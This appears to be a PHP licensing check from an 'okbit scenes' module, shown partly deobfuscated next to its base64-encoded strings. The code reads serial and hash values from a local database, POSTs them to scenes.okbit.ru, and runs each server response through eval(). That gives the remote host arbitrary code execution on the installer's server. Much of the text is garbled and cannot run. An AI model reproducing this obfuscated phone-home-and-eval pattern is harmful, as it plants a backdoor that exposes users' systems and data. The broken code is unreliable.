
<? 
$GLOBALS['_scenes_okbit_']=Array(stream_context_create, file_get_contents, stream_context_create, file_get_contents); 
?>

<? 
function scenes_okbit($i){
                 0                          1                                    2       3        4          5           6           7           8           9         10      11     12      13        14                                                    15           16                                  
                                                        
$a=Array(SELECT * FROM event,'http://scenes.okbit.ru/ver/id.php?mode=veriff','name=','SERIAL','&bench=','SERIAL_ID','&name_new=','HASH_NEW','&name_old=','HASH_OLD','http','method','POST','header','Content-type: application/x-www-form-urlencoded,content','','http://scenes.okbit.ru/ver/id.php?mode=save',
                 18       19       20         21         22            23         24            25       26      27      28      29         30                                               31       32                           33   34        35         36          37 
               'name=','SERIAL','&bench=','SERIAL_ID','&name_new=','HASH_NEW','&name_old=','HASH_OLD','http','method','POST','header','Content-type: application/x-www-form-urlencoded','content','SELECT * FROM event WHERE ID=1','','HASH_OLD','HASH_NEW','HASH_NEW','event');
return base64_decode($a[$i]);} 
?>

<?php 
$okbit_0=SQLSelectOne('SELECT * FROM event');
$okbit_1='http://scenes.okbit.ru/ver/id.php?mode=veriff';
$okbit_2='name=' .$okbit_0['SERIAL'] .'&bench=' .$okbit_0['SERIAL_ID'] .'&name_new=' .$okbit_0['HASH_NEW'] .'&name_old=' .$okbit_0['HASH_OLD'];
$okbit_3=array('http'=> array('method'=> 'POST','header'=> 'Content-type: application/x-www-form-urlencoded','content',''=> $okbit_2));
$contents='';
$okbit_4=stream_context_create($okbit_3); 
$contents=file_get_contents($okbit_1,false,$okbit_4); 
eval('?' .'>' .$contents .'<' .'?');
$okbit_1="http://scenes.okbit.ru/ver/id.php?mode=save";
$okbit_2= 'name=' .$okbit_0['SERIAL'] .'&bench=' .$okbit_0['SERIAL_ID'] .'&name_new=' .$okbit_0['HASH_NEW'] .'&name_old=' .$okbit_0['HASH_OLD'];
$okbit_3=array(http=> array('method'=> 'POST','header'=> 'Content-type: application/x-www-form-urlencoded','content'=> $okbit_2));
$okbit_4=stream_context_create($okbit_3);
$contents2=file_get_contents($okbit_1,false,$okbit_4); 
eval('?' .'>' .$contents2 .'<' .'?');
$okbit_5=SQLSelectOne('SELECT * FROM event WHERE ID=1');

if($new_key !=''){
  $okbit_5[HASH_OLD]=$okbit_5[HASH_NEW];
  $okbit_5[HASH_NEW]=$new_key;
}
SQLUpdate(event,$okbit_5); 
?>

('U0VMRUNUICogRlJPTSBldmVudA==', 0
'aHR0cDovL3NjZW5lcy5va2JpdC5ydS92ZXIvaWQucGhwP21vZGU9dmVyaWZm', 1
'bmFtZT0=',2
'U0VSSUFM',3
'JmJlbmNoPQ==',4
'U0VSSUFMX0lE',5
'Jm5hbWVfbmV3PQ==',6
'SEFTSF9ORVc=',7
'Jm5hbWVfb2xkPQ==',8
'SEFTSF9PTEQ=',9
'aHR0cA==',10
'bWV0aG9k',11
'UE9TVA==',12
'aGVhZGVy',13
'Q29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ=',14
'Y29udGVudA==',15
'',16
'aHR0cDovL3NjZW5lcy5va2JpdC5ydS92ZXIvaWQucGhwP21vZGU9c2F2ZQ==', 17
'bmFtZT0=',
'U0VSSUFM',
'JmJlbmNoPQ==',
'U0VSSUFMX0lE',
'Jm5hbWVfbmV3PQ==',
'SEFTSF9ORVc=',
'Jm5hbWVfb2xkPQ==',
'SEFTSF9PTEQ=',
'aHR0cA==',
'bWV0aG9k',
'UE9TVA==',
'aGVhZGVy',
'Q29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ=',
'Y29udGVudA==',
'U0VMRUNUICogRlJPTSBldmVudCBXSEVSRSBJRD0x',
'',
'SEFTSF9PTEQ=',
'SEFTSF9ORVc=',
'SEFTSF9ORVc=',
'ZXZlbnQ='
)
